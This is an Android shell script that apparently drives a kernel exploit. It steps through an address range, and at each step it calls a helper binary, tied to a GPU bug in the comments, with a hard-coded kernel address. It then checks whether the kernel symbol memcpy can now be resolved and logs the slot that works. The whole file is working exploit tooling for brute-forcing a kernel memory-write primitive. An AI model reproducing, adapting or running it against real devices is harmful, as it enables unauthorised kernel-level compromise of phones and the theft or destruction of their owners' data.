#!/system/bin/sh
# Safe scan v3: timeout -k forces SIGKILL even if gaw64 wedges in kernel.
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
KLN=ffffffc00111e5d0
LOG=$D/scan3.log
START=2092000
END=21cd000

: > $LOG
cur=$START
while [ $((16#$cur)) -lt $((16#$END)) ]; do
  P=$(printf '%x' $((0x$cur + 0x7a0)))
  echo "try $cur slot=$P" >> $LOG
  timeout -k 2 8 $GW $P $KLN >/dev/null 2>&1
  RC=$?
  if [ $RC -ne 0 ]; then
    echo "GPU WEDGE at $cur (rc=$RC) - abort" >> $LOG
    exit 4
  fi
  R=$(timeout -k 2 6 $KF sym memcpy 2>/dev/null | tail -1)
  echo "$cur -> $R" >> $LOG
  case "$R" in
    *memcpy*=0xffffffffffffffff*) ;;
    *memcpy*=0x*)
      A=$(echo "$R" | sed 's/.*=0x\([0-9a-f]*\).*/\1/')
      echo "HIT slot=$P memcpy=0x$A" >> $LOG
      echo "HIT slot=$P memcpy=0x$A"
      exit 0
      ;;
    '') echo "DEAD at $cur" >> $LOG; exit 3;;
  esac
  cur=$(printf '%x' $((0x$cur + 0x1000)))
done
echo "DONE no hit" >> $LOG
exit 2
